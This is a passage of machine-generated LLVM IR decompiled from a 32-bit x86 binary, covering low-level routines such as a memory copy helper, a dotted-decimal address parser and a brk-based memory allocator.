  store i32 %v4_805366d, i32* %eax.global-to-local, align 4
  %v1_8053671 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053671 = add i32 %v1_8053671, 20
  %v3_8053671 = inttoptr i32 %v2_8053671 to i32*
  store i32 %v4_805366d, i32* %v3_8053671, align 4
  %v0_8053674 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053674 = add i32 %v0_8053674, 12
  %v2_8053674 = inttoptr i32 %v1_8053674 to i16*
  %v3_8053674 = load i16, i16* %v2_8053674, align 2
  %v4_8053674 = zext i16 %v3_8053674 to i32
  store i32 %v4_8053674, i32* %eax.global-to-local, align 4
  %v1_8053678 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053678 = add i32 %v1_8053678, 24
  %v3_8053678 = inttoptr i32 %v2_8053678 to i32*
  store i32 %v4_8053674, i32* %v3_8053678, align 4
  %v0_805367b = load i32, i32* %esi.global-to-local, align 4
  %v1_805367b = add i32 %v0_805367b, 14
  %v2_805367b = inttoptr i32 %v1_805367b to i16*
  %v3_805367b = load i16, i16* %v2_805367b, align 2
  %v4_805367b = zext i16 %v3_805367b to i32
  store i32 %v4_805367b, i32* %eax.global-to-local, align 4
  %v1_805367f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805367f = add i32 %v1_805367f, 28
  %v3_805367f = inttoptr i32 %v2_805367f to i32*
  store i32 %v4_805367b, i32* %v3_805367f, align 4
  %v0_8053682 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053682 = add i32 %v0_8053682, 16
  %v2_8053682 = inttoptr i32 %v1_8053682 to i16*
  %v3_8053682 = load i16, i16* %v2_8053682, align 2
  %v4_8053682 = zext i16 %v3_8053682 to i32
  store i32 %v4_8053682, i32* %eax.global-to-local, align 4
  %v0_8053686 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053686 = add i32 %v0_8053686, 36
  %v2_8053686 = inttoptr i32 %v1_8053686 to i32*
  store i32 0, i32* %v2_8053686, align 4
  %v0_805368d = load i32, i32* %eax.global-to-local, align 4
  %v1_805368d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805368d = add i32 %v1_805368d, 32
  %v3_805368d = inttoptr i32 %v2_805368d to i32*
  store i32 %v0_805368d, i32* %v3_805368d, align 4
  %v0_8053690 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053690 = add i32 %v0_8053690, 20
  %v2_8053690 = inttoptr i32 %v1_8053690 to i32*
  %v3_8053690 = load i32, i32* %v2_8053690, align 4
  store i32 %v3_8053690, i32* %eax.global-to-local, align 4
  %v1_8053693 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053693 = add i32 %v1_8053693, 44
  %v3_8053693 = inttoptr i32 %v2_8053693 to i32*
  store i32 %v3_8053690, i32* %v3_8053693, align 4
  %v0_8053696 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053696 = add i32 %v0_8053696, 24
  %v2_8053696 = inttoptr i32 %v1_8053696 to i32*
  %v3_8053696 = load i32, i32* %v2_8053696, align 4
  store i32 %v3_8053696, i32* %eax.global-to-local, align 4
  %v1_8053699 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053699 = add i32 %v1_8053699, 48
  %v3_8053699 = inttoptr i32 %v2_8053699 to i32*
  store i32 %v3_8053696, i32* %v3_8053699, align 4
  %v0_805369c = load i32, i32* %esi.global-to-local, align 4
  %v1_805369c = add i32 %v0_805369c, 28
  %v2_805369c = inttoptr i32 %v1_805369c to i32*
  %v3_805369c = load i32, i32* %v2_805369c, align 4
  store i32 %v3_805369c, i32* %eax.global-to-local, align 4
  %v1_805369f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805369f = add i32 %v1_805369f, 52
  %v3_805369f = inttoptr i32 %v2_805369f to i32*
  store i32 %v3_805369c, i32* %v3_805369f, align 4
  %v0_80536a2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80536a2 = add i32 %v0_80536a2, 32
  %v2_80536a2 = inttoptr i32 %v1_80536a2 to i32*
  %v3_80536a2 = load i32, i32* %v2_80536a2, align 4
  store i32 %v3_80536a2, i32* %eax.global-to-local, align 4
  %v1_80536a5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80536a5 = add i32 %v1_80536a5, 56
  %v3_80536a5 = inttoptr i32 %v2_80536a5 to i32*
  store i32 %v3_80536a2, i32* %v3_80536a5, align 4
  %v0_80536a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80536a8 = add i32 %v0_80536a8, 40
  %v2_80536a8 = inttoptr i32 %v1_80536a8 to i32*
  %v3_80536a8 = load i32, i32* %v2_80536a8, align 4
  store i32 %v3_80536a8, i32* %eax.global-to-local, align 4
  %v1_80536ab = load i32, i32* %ebx.global-to-local, align 4
  %v2_80536ab = add i32 %v1_80536ab, 64
  %v3_80536ab = inttoptr i32 %v2_80536ab to i32*
  store i32 %v3_80536a8, i32* %v3_80536ab, align 4
  %v0_80536ae = load i32, i32* %esi.global-to-local, align 4
  %v1_80536ae = add i32 %v0_80536ae, 48
  %v2_80536ae = inttoptr i32 %v1_80536ae to i32*
  %v3_80536ae = load i32, i32* %v2_80536ae, align 4
  store i32 %v3_80536ae, i32* %eax.global-to-local, align 4
  %v1_80536b1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80536b1 = add i32 %v1_80536b1, 72
  %v3_80536b1 = inttoptr i32 %v2_80536b1 to i32*
  store i32 %v3_80536ae, i32* %v3_80536b1, align 4
  %v2_80536b7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80536b7, i32* @ebx, align 4
  ret i32 %v3_80536ae

; uselistorder directives
  uselistorder i32 72, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 64, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i32 40, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32 56, { 1, 0, 2, 3, 4 }
  uselistorder i32 52, { 2, 1, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 48, { 3, 4, 2, 0, 1, 5, 6, 7 }
  uselistorder i32 32, { 22, 23, 32, 15, 19, 20, 21, 24, 1, 0, 2, 3, 18, 4, 5, 6, 7, 8, 26, 25, 10, 9, 12, 11, 13, 14, 17, 16, 27, 28, 29, 30, 31 }
  uselistorder i32 36, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 24, { 13, 14, 9, 10, 11, 15, 12, 16, 17, 1, 2, 8, 30, 20, 27, 0, 28, 3, 18, 7, 6, 35, 31, 19, 32, 21, 22, 23, 5, 24, 4, 25, 26, 29, 33, 34, 36, 37, 38, 39, 40 }
  uselistorder i32 20, { 16, 17, 4, 12, 13, 14, 18, 15, 19, 20, 21, 2, 3, 10, 22, 1, 5, 9, 8, 7, 6, 23, 11, 24, 25, 0, 26 }
  uselistorder i32 16, { 39, 40, 32, 33, 34, 35, 36, 37, 14, 28, 54, 3, 29, 30, 31, 0, 4, 41, 42, 6, 5, 43, 1, 7, 38, 44, 15, 17, 27, 11, 12, 23, 45, 8, 46, 24, 47, 9, 18, 10, 22, 21, 13, 20, 19, 48, 49, 50, 25, 51, 2, 26, 52, 16, 53 }
  uselistorder i32 8, { 39, 28, 29, 30, 31, 32, 33, 34, 35, 9, 100, 10, 101, 17, 11, 18, 81, 82, 83, 84, 85, 86, 87, 3, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 4, 20, 21, 22, 23, 24, 25, 26, 27, 40, 41, 42, 43, 44, 45, 13, 5, 14, 6, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 12, 63, 64, 7, 65, 66, 67, 68, 8, 69, 36, 37, 38, 70, 99, 92, 93, 94, 15, 1, 2, 88, 89, 90, 91, 19, 95, 96, 97, 16, 98, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_80514ec, { 1, 4, 3, 2, 0 }
}

define i32 @function_80536ba(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80536ba:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80536bb = load i32, i32* @esi, align 4
  store i32 %v0_80536bb, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_80536bc = sdiv i32 %sext, 16777216
  store i32 %v4_80536bc, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80536c6 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80536c6, i32* %edi.global-to-local, align 4
  %v2_80536ca = udiv i32 %v4_80536bc, 4
  %v3_80536cd = inttoptr i32 %arg2 to i8*
  %v4_80536cd = bitcast i16* %arg1 to i8*
  %v5_80536cd = call i8* @_memcpy(i8* %v4_80536cd, i8* %v3_80536cd, i32 %v2_80536ca)
  %v0_80536cf = load i32, i32* %eax.global-to-local, align 4
  %v2_80536cf = and i32 %v0_80536cf, 2
  %v3_80536cf = icmp eq i32 %v2_80536cf, 0
  br i1 %v3_80536cf, label %dec_label_pc_80536d5, label %dec_label_pc_80536d3

dec_label_pc_80536d3:                             ; preds = %dec_label_pc_80536ba
  %v0_80536d3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80536d3 = inttoptr i32 %v0_80536d3 to i16*
  %v2_80536d3 = load i16, i16* %v1_80536d3, align 2
  %v3_80536d3 = load i32, i32* %edi.global-to-local, align 4
  %v4_80536d3 = inttoptr i32 %v3_80536d3 to i16*
  store i16 %v2_80536d3, i16* %v4_80536d3, align 2
  %v5_80536d3 = load i32, i32* %edi.global-to-local, align 4
  %v6_80536d3 = load i32, i32* %esi.global-to-local, align 4
  %v7_80536d3 = load i1, i1* @df, align 1
  %v8_80536d3 = select i1 %v7_80536d3, i32 -2, i32 2
  %v9_80536d3 = add i32 %v8_80536d3, %v5_80536d3
  %v10_80536d3 = add i32 %v8_80536d3, %v6_80536d3
  store i32 %v9_80536d3, i32* %edi.global-to-local, align 4
  store i32 %v10_80536d3, i32* %esi.global-to-local, align 4
  %v0_80536d5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536d5

dec_label_pc_80536d5:                             ; preds = %dec_label_pc_80536ba, %dec_label_pc_80536d3
  %v0_80536d5 = phi i32 [ %v0_80536cf, %dec_label_pc_80536ba ], [ %v0_80536d5.pre, %dec_label_pc_80536d3 ]
  %v2_80536d5 = urem i32 %v0_80536d5, 2
  %v3_80536d5 = icmp eq i32 %v2_80536d5, 0
  br i1 %v3_80536d5, label %dec_label_pc_80536da, label %dec_label_pc_80536d9

dec_label_pc_80536d9:                             ; preds = %dec_label_pc_80536d5
  %v0_80536d9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80536d9 = inttoptr i32 %v0_80536d9 to i8*
  %v2_80536d9 = load i8, i8* %v1_80536d9, align 1
  %v3_80536d9 = load i32, i32* %edi.global-to-local, align 4
  %v4_80536d9 = inttoptr i32 %v3_80536d9 to i8*
  store i8 %v2_80536d9, i8* %v4_80536d9, align 1
  %v5_80536d9 = load i32, i32* %edi.global-to-local, align 4
  %v6_80536d9 = load i32, i32* %esi.global-to-local, align 4
  %v7_80536d9 = load i1, i1* @df, align 1
  %v8_80536d9 = select i1 %v7_80536d9, i32 -1, i32 1
  %v9_80536d9 = add i32 %v8_80536d9, %v5_80536d9
  %v10_80536d9 = add i32 %v8_80536d9, %v6_80536d9
  store i32 %v9_80536d9, i32* %edi.global-to-local, align 4
  store i32 %v10_80536d9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80536da

dec_label_pc_80536da:                             ; preds = %dec_label_pc_80536d5, %dec_label_pc_80536d9
  store i32 %v4_80536c6, i32* %eax.global-to-local, align 4
  %v2_80536de = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80536de, i32* @esi, align 4
  ret i32 %v4_80536c6

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 12, 11, 9, 10, 0, 2, 1, 6, 5, 4, 3, 7, 8 }
  uselistorder i1* @df, { 3, 4, 1, 0, 2 }
  uselistorder i32 4, { 3, 40, 41, 32, 33, 34, 35, 150, 151, 154, 155, 0, 159, 160, 161, 152, 9, 18, 156, 158, 71, 80, 81, 82, 83, 84, 4, 72, 73, 74, 75, 76, 77, 78, 79, 69, 70, 21, 11, 22, 23, 24, 25, 26, 27, 28, 5, 30, 29, 42, 6, 43, 10, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 8, 64, 65, 67, 66, 7, 157, 153, 31, 14, 36, 37, 38, 39, 68, 116, 117, 15, 89, 90, 16, 91, 126, 127, 123, 124, 92, 93, 94, 118, 119, 120, 1, 121, 122, 113, 114, 115, 85, 86, 2, 87, 88, 101, 102, 103, 98, 99, 100, 128, 129, 95, 96, 97, 104, 105, 106, 107, 108, 109, 110, 111, 112, 125, 19, 130, 131, 132, 133, 134, 136, 137, 135, 138, 139, 140, 143, 141, 142, 144, 12, 17, 145, 13, 146, 147, 148, 149, 162, 20 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* @esi, { 103, 104, 7, 8, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 1, 33, 34, 105, 106, 6, 107, 108, 109, 113, 116, 117, 118, 110, 111, 112, 56, 65, 2, 66, 67, 60, 61, 62, 63, 64, 57, 58, 59, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 40, 41, 42, 43, 44, 45, 46, 0, 47, 48, 49, 50, 3, 51, 5, 52, 53, 54, 55, 22, 91, 92, 35, 4, 36, 37, 38, 39, 68, 114, 115, 93, 94, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 85, 86, 87, 84, 70, 81, 80, 95, 82, 83, 88, 89, 90, 96, 97, 98, 99, 100, 101, 102, 119 }
  uselistorder label %dec_label_pc_80536da, { 1, 0 }
  uselistorder label %dec_label_pc_80536d5, { 1, 0 }
}

define i32 @function_80536e1(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80536e1:
  %v1_80536ec = icmp eq i8* %arg1, null
  br i1 %v1_80536ec, label %dec_label_pc_805376d, label %dec_label_pc_80536f0

dec_label_pc_80536f0:                             ; preds = %dec_label_pc_80536e1
  %v4_80536e8 = ptrtoint i8* %arg1 to i32
  %v0_80536fe.pre = load i32, i32* bitcast (i32** @global_var_8055088.71 to i32*), align 8
  br label %dec_label_pc_80536fb

dec_label_pc_80536fb:                             ; preds = %dec_label_pc_80536f0, %dec_label_pc_8053744
  %v0_8053744 = phi i32 [ 0, %dec_label_pc_80536f0 ], [ %v2_805374a, %dec_label_pc_8053744 ]
  %v2_8053747 = phi i32 [ 1, %dec_label_pc_80536f0 ], [ %v3_8053747, %dec_label_pc_8053744 ]
  %v0_80536fb = phi i32 [ %v4_80536e8, %dec_label_pc_80536f0 ], [ %v0_80536fb3, %dec_label_pc_8053744 ]
  %v1_80536fb = inttoptr i32 %v0_80536fb to i8*
  %v2_80536fb = load i8, i8* %v1_80536fb, align 1
  %v3_80536fb = sext i8 %v2_80536fb to i32
  %v2_8053704 = mul nsw i32 %v3_80536fb, 2
  %v3_8053704 = add i32 %v2_8053704, %v0_80536fe.pre
  %v4_8053704 = inttoptr i32 %v3_8053704 to i8*
  %v5_8053704 = load i8, i8* %v4_8053704, align 1
  %v6_8053704 = and i8 %v5_8053704, 8
  %v7_8053704 = icmp eq i8 %v6_8053704, 0
  br i1 %v7_8053704, label %dec_label_pc_805376d, label %dec_label_pc_805370b

dec_label_pc_805370b:                             ; preds = %dec_label_pc_80536fb
  %v4_805371f.pre = load i32, i32* @edx, align 4
  %v2_805371f34 = load i8, i8* %v1_80536fb, align 1
  %v3_805371f35 = zext i8 %v2_805371f34 to i32
  %v5_805371f36 = and i32 %v4_805371f.pre, -256
  %v6_805371f37 = or i32 %v3_805371f35, %v5_805371f36
  store i32 %v6_805371f37, i32* @edx, align 4
  %v2_805372138 = sext i8 %v2_805371f34 to i32
  %v2_805372439 = mul nsw i32 %v2_805372138, 2
  %v3_805372440 = add i32 %v2_805372439, %v0_80536fe.pre
  %v4_805372441 = inttoptr i32 %v3_805372440 to i16*
  %v5_805372442 = load i16, i16* %v4_805372441, align 2
  %v2_805372944 = and i16 %v5_805372442, 8
  %v3_805372945 = icmp eq i16 %v2_805372944, 0
  %v1_805372b46 = icmp eq i1 %v3_805372945, false
  br i1 %v1_805372b46, label %dec_label_pc_805370f, label %dec_label_pc_805372d

dec_label_pc_805370f:                             ; preds = %dec_label_pc_805370b, %dec_label_pc_805371e
  %v2_805372150 = phi i32 [ %v2_8053721, %dec_label_pc_805371e ], [ %v2_805372138, %dec_label_pc_805370b ]
  %v6_805371f49 = phi i32 [ %v6_805371f, %dec_label_pc_805371e ], [ %v6_805371f37, %dec_label_pc_805370b ]
  %v0_805371e48 = phi i32 [ %v1_805371e, %dec_label_pc_805371e ], [ %v0_80536fb, %dec_label_pc_805370b ]
  %v1_805370f47 = phi i32 [ %v3_8053712, %dec_label_pc_805371e ], [ 0, %dec_label_pc_805370b ]
  %v3_805370f = mul i32 %v1_805370f47, 10
  %v2_8053712 = add i32 %v3_805370f, -48
  %v3_8053712 = add i32 %v2_8053712, %v2_805372150
  %v1_8053716 = add i32 %v3_8053712, -255
  %v6_8053716 = sub i32 254, %v3_8053712
  %v7_8053716 = and i32 %v6_8053716, %v3_8053712
  %v8_8053716 = icmp slt i32 %v7_8053716, 0
  %v9_8053716 = icmp eq i32 %v1_8053716, 0
  %v10_8053716 = icmp slt i32 %v1_8053716, 0
  %v3_805371c = icmp eq i1 %v10_8053716, %v8_8053716
  %v4_805371c = icmp eq i1 %v9_8053716, false
  %v5_805371c = and i1 %v4_805371c, %v3_805371c
  br i1 %v5_805371c, label %dec_label_pc_805376d, label %dec_label_pc_805371e

dec_label_pc_805371e:                             ; preds = %dec_label_pc_805370f
  %v1_805371e = add i32 %v0_805371e48, 1
  %v1_805371f = inttoptr i32 %v1_805371e to i8*
  %v2_805371f = load i8, i8* %v1_805371f, align 1
  %v3_805371f = zext i8 %v2_805371f to i32
  %v5_805371f = and i32 %v6_805371f49, -256
  %v6_805371f = or i32 %v3_805371f, %v5_805371f
  store i32 %v6_805371f, i32* @edx, align 4
  %v2_8053721 = sext i8 %v2_805371f to i32
  %v2_8053724 = mul nsw i32 %v2_8053721, 2
  %v3_8053724 = add i32 %v2_8053724, %v0_80536fe.pre
  %v4_8053724 = inttoptr i32 %v3_8053724 to i16*
  %v5_8053724 = load i16, i16* %v4_8053724, align 2
  %v2_8053729 = and i16 %v5_8053724, 8
  %v3_8053729 = icmp eq i16 %v2_8053729, 0
  %v1_805372b = icmp eq i1 %v3_8053729, false
  br i1 %v1_805372b, label %dec_label_pc_805370f, label %dec_label_pc_805372d

dec_label_pc_805372d:                             ; preds = %dec_label_pc_805371e, %dec_label_pc_805370b
  %v1_805370f.lcssa = phi i32 [ 0, %dec_label_pc_805370b ], [ %v3_8053712, %dec_label_pc_805371e ]
  %v0_805371e.lcssa = phi i32 [ %v0_80536fb, %dec_label_pc_805370b ], [ %v1_805371e, %dec_label_pc_805371e ]
  %v2_805371f.lcssa = phi i8 [ %v2_805371f34, %dec_label_pc_805370b ], [ %v2_805371f, %dec_label_pc_805371e ]
  %v6_8053724.lcssa.in = phi i16 [ %v5_805372442, %dec_label_pc_805370b ], [ %v5_8053724, %dec_label_pc_805371e ]
  %v8_805372d = sub nsw i32 2, %v2_8053747
  %v9_805372d = and i32 %v8_805372d, %v2_8053747
  %v10_805372d = icmp slt i32 %v9_805372d, 0
  %v11_805372d = icmp eq i32 %v2_8053747, 3
  %v12_805372d = icmp slt i32 %v2_8053747, 3
  %v3_8053731 = icmp eq i1 %v12_805372d, %v10_805372d
  %v4_8053731 = icmp eq i1 %v11_805372d, false
  %v5_8053731 = and i1 %v4_8053731, %v3_8053731
  br i1 %v5_8053731, label %dec_label_pc_805373b, label %dec_label_pc_8053733

dec_label_pc_8053733:                             ; preds = %dec_label_pc_805372d
  %v10_8053733 = icmp eq i8 %v2_805371f.lcssa, 46
  %v1_8053736 = icmp eq i1 %v10_8053733, false
  br i1 %v1_8053736, label %dec_label_pc_805376d, label %dec_label_pc_8053738

dec_label_pc_8053738:                             ; preds = %dec_label_pc_8053733
  br label %dec_label_pc_8053744

dec_label_pc_805373b:                             ; preds = %dec_label_pc_805372d
  %v4_805373c = icmp ne i8 %v2_805371f.lcssa, 0
  %v2_8053740 = and i16 %v6_8053724.lcssa.in, 32
  %v3_8053740 = icmp eq i16 %v2_8053740, 0
  %or.cond = and i1 %v4_805373c, %v3_8053740
  br i1 %or.cond, label %dec_label_pc_805376d, label %dec_label_pc_8053744

dec_label_pc_8053744:                             ; preds = %dec_label_pc_805373b, %dec_label_pc_8053738
  %v0_80536fb3 = add i32 %v0_805371e.lcssa, 1
  %v2_8053744 = mul i32 %v0_8053744, 256
  %v3_8053747 = add nuw nsw i32 %v2_8053747, 1
  %v2_805374a = or i32 %v1_805370f.lcssa, %v2_8053744
  %v7_8053750 = icmp sgt i32 %v2_8053747, 3
  br i1 %v7_8053750, label %dec_label_pc_8053752, label %dec_label_pc_80536fb

dec_label_pc_8053752:                             ; preds = %dec_label_pc_8053744
  %v4_8053757 = icmp eq i32 %arg2, 0
  br i1 %v4_8053757, label %dec_label_pc_805376f, label %dec_label_pc_805375e

dec_label_pc_805375e:                             ; preds = %dec_label_pc_8053752
  %v1_8053762 = call i32 @llvm.bswap.i32(i32 %v2_805374a)
  %v2_8053764 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8053762, i32* %v2_8053764, align 4
  br label %dec_label_pc_805376f

dec_label_pc_805376d:                             ; preds = %dec_label_pc_805373b, %dec_label_pc_8053733, %dec_label_pc_80536fb, %dec_label_pc_805370f, %dec_label_pc_80536e1
  br label %dec_label_pc_805376f

dec_label_pc_805376f:                             ; preds = %dec_label_pc_8053752, %dec_label_pc_805375e, %dec_label_pc_805376d
  %v0_8053774 = phi i32 [ 1, %dec_label_pc_8053752 ], [ 1, %dec_label_pc_805375e ], [ 0, %dec_label_pc_805376d ]
  ret i32 %v0_8053774

; uselistorder directives
  uselistorder i32 %v2_8053721, { 1, 0 }
  uselistorder i32 %v6_805371f, { 1, 0 }
  uselistorder i32 %v1_805371e, { 0, 2, 1 }
  uselistorder i32 %v1_8053716, { 1, 0 }
  uselistorder i32 %v3_8053712, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8053747, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_80536fe.pre, { 1, 0, 2 }
  uselistorder i32 256, { 1, 13, 15, 14, 2, 0, 3, 4, 5, 16, 11, 7, 6, 8, 9, 12, 10 }
  uselistorder i8 46, { 1, 0, 2, 3 }
  uselistorder i32 3, { 1, 2, 0, 12, 10, 13, 6, 7, 9, 3, 14, 15, 16, 17, 18, 19, 20, 11, 4, 8, 5 }
  uselistorder i32 10, { 0, 5, 4, 2, 6, 1, 10, 7, 8, 9, 3, 11 }
  uselistorder i16 0, { 0, 2, 1, 5, 6, 7, 8, 3, 4 }
  uselistorder i16 8, { 1, 0 }
  uselistorder i32 -256, { 9, 1, 3, 4, 40, 6, 5, 2, 10, 11, 20, 7, 27, 22, 23, 8, 12, 13, 14, 15, 16, 17, 18, 19, 21, 24, 25, 26, 28, 29, 30, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 41 }
  uselistorder i8 0, { 38, 39, 196, 195, 35, 36, 37, 26, 28, 29, 30, 31, 32, 33, 19, 34, 27, 44, 2, 48, 49, 50, 51, 53, 54, 55, 56, 57, 40, 58, 59, 42, 43, 41, 60, 61, 0, 62, 63, 64, 65, 66, 67, 68, 3, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 4, 5, 79, 80, 81, 82, 47, 83, 46, 84, 45, 85, 86, 87, 88, 89, 90, 6, 91, 92, 93, 94, 7, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 8, 105, 9, 15, 10, 106, 107, 11, 108, 109, 110, 12, 111, 16, 13, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 14, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 52, 173, 1, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 17, 18, 25, 20, 21, 22, 23, 24 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 2, { 28, 32, 11, 33, 0, 56, 13, 57, 14, 26, 1, 2, 3, 29, 4, 5, 6, 15, 16, 30, 7, 8, 18, 9, 20, 17, 19, 23, 21, 22, 34, 35, 36, 37, 38, 44, 43, 31, 40, 39, 45, 46, 47, 48, 49, 50, 41, 42, 51, 52, 10, 27, 53, 25, 24, 12, 54, 55 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805376f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805376d, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805370f, { 1, 0 }
  uselistorder label %dec_label_pc_80536fb, { 1, 0 }
}

define i32 @function_8053775(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053775:
  %v0_8053778 = call i32 @function_8050fb7()
  %v0_805377d = load i32, i32* @edx, align 4
  %v4_8053784 = call i32 @function_8051042(i32 %v0_8053778, i32 %arg1, i32 %v0_805377d, i32 %v0_805377d)
  ret i32 %v4_8053784

; uselistorder directives
  uselistorder i32* @edx, { 105, 89, 0, 2, 68, 69, 1, 14, 15, 19, 13, 101, 22, 107, 108, 114, 113, 72, 82, 3, 83, 84, 85, 86, 87, 88, 73, 74, 75, 76, 77, 78, 79, 4, 80, 81, 70, 71, 16, 5, 17, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 6, 60, 61, 62, 63, 64, 65, 66, 110, 18, 20, 21, 67, 109, 104, 106, 111, 112, 92, 93, 94, 95, 96, 97, 8, 98, 99, 100, 10, 11, 90, 91, 9, 7, 102, 12, 103, 115 }
}

define i32 @function_805378d() local_unnamed_addr {
dec_label_pc_805378d:
  %v0_805378d = load i32, i32* @eax, align 4
  %v1_805378d = add i32 %v0_805378d, 28
  %v2_805378d = inttoptr i32 %v1_805378d to i32*
  %v3_805378d = load i32, i32* %v2_805378d, align 4
  store i32 %v3_805378d, i32* @global_var_8055698.72, align 8
  %v1_8053796 = add i32 %v0_805378d, 44
  %v2_8053796 = inttoptr i32 %v1_8053796 to i32*
  %v3_8053796 = load i32, i32* %v2_8053796, align 4
  store i32 %v3_8053796, i32* @global_var_805569c.73, align 4
  ret i32 %v3_8053796

; uselistorder directives
  uselistorder i32 44, { 13, 2, 1, 6, 8, 7, 3, 4, 5, 0, 9, 10, 11, 12 }
  uselistorder i32 28, { 26, 16, 17, 13, 14, 15, 18, 1, 2, 10, 11, 0, 3, 5, 4, 9, 8, 19, 12, 20, 21, 7, 6, 22, 23, 24, 25 }
}

define i32 @function_805379f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805379f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805379f = load i32, i32* @ebx, align 4
  store i32 %v0_805379f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80537b2 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80537b2, i32* @global_var_8055158.70, align 8
  %v7_80537bd = icmp ult i32 %v1_80537b2, %arg1
  %v1_80537bf = icmp eq i1 %v7_80537bd, false
  br i1 %v1_80537bf, label %dec_label_pc_80537cf, label %dec_label_pc_80537c1

dec_label_pc_80537c1:                             ; preds = %dec_label_pc_805379f
  %v1_80537c1 = call i32 @function_805149b(i32 %v0_805379f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80537c9 = inttoptr i32 %v1_80537c1 to i32*
  store i32 12, i32* %v1_80537c9, align 4
  %v0_80537cf.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_80537d3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80537cf

dec_label_pc_80537cf:                             ; preds = %dec_label_pc_805379f, %dec_label_pc_80537c1
  %v2_80537d3 = phi i32 [ %v0_805379f, %dec_label_pc_805379f ], [ %v2_80537d3.pre, %dec_label_pc_80537c1 ]
  %v0_80537cf = phi i32 [ 0, %dec_label_pc_805379f ], [ %v0_80537cf.pre, %dec_label_pc_80537c1 ]
  store i32 %v2_80537d3, i32* @ebx, align 4
  ret i32 %v0_80537cf

; uselistorder directives
  uselistorder i32 %v1_80537b2, { 1, 0 }
